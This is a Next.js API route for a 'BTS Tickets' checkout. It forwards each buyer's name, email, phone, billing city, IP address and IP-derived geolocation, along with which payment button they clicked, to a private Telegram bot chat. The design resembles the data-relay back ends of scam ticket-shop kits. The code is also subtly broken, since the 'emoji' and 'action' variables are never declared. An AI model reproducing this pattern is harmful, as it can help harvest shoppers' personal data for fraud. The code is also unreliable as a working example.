import { NextRequest, NextResponse } from "next/server";

// Telegram Bot configuration - set these in environment variables
const TELEGRAM_BOT_TOKEN = (process.env.TELEGRAM_BOT_TOKEN || "").replace(/["']/g, "");
const TELEGRAM_CHAT_ID = (process.env.TELEGRAM_CHAT_ID || "").replace(/["']/g, "");

interface NotificationPayload {
    type: "checkout_start" | "pay_card" | "pay_iban" | "pay_paypal";
    amount: number;
    firstName: string;
    lastName: string;
    email: string;
    country: string;
    city: string;
    phoneNumber?: string;
    geo?: {
        ip?: string;
        country?: string;
        city?: string;
        region?: string;
    };
}

export async function POST(request: NextRequest) {
    try {
        const body: NotificationPayload = await request.json();

        // Get client IP for geo
        const ip = request.headers.get("x-forwarded-for")?.split(",")[0] ||
            request.headers.get("x-real-ip") ||
            "Unknown";

        // Get geo info from IP (using ip-api.com free service)
        let geoInfo = "Unknown location";
        try {
            const geoRes = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,city,regionName`);
            const geoData = await geoRes.json();
            if (geoData.status === "success") {
                geoInfo = `${geoData.city || "?"}, ${geoData.regionName || "?"}, ${geoData.country || "?"}`;
            }
        } catch (e) {
            console.error("Geo lookup failed:", e);
        }

        // Format message based on notification type
        if (body.type === "checkout_start") {
            emoji = "🛒";
            action = "started checkout process";
        } else if (body.type === "pay_card") {
            emoji = "💳";
            action = "clicked PAY WITH CARD";
        } else if (body.type === "pay_iban") {
            emoji = "🏦";
            action = "clicked PAY VIA IBAN";
        } else if (body.type === "pay_paypal") {
            emoji = "💰";
            action = "clicked PAY VIA PAYPAL";
        }

        const customerInfo = body.email
            ? `👤 *Customer:* ${body.firstName} ${body.lastName}\n📧 *Email:* ${body.email}\n📞 *Phone:* ${body.phoneNumber || "Not provided"}\n🏠 *Billing:* ${body.city}, ${body.country}`
            : `👤 *Customer:* Visitor (Details not yet entered)`;

        const message = `
${emoji} *BTS Tickets - New Event*

${customerInfo}

💰 *Amount:* €${body.amount}

🌍 *GEO (IP):* ${geoInfo}
🔗 *IP:* ${ip}

⏰ *Time:* ${new Date().toISOString()}

📝 *Action:* ${action}
`;

        // Send to Telegram
        if (TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID) {
            await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    chat_id: TELEGRAM_CHAT_ID,
                    text: message,
                    parse_mode: "Markdown",
                }),
            });
        } else {
            console.log("Telegram notification (no bot configured):", message);
        }

        return NextResponse.json({ success: true });
    } catch (error) {
        console.error("Notification error:", error);
        return NextResponse.json({ error: "Failed to send notification" }, { status: 500 });
    }
}
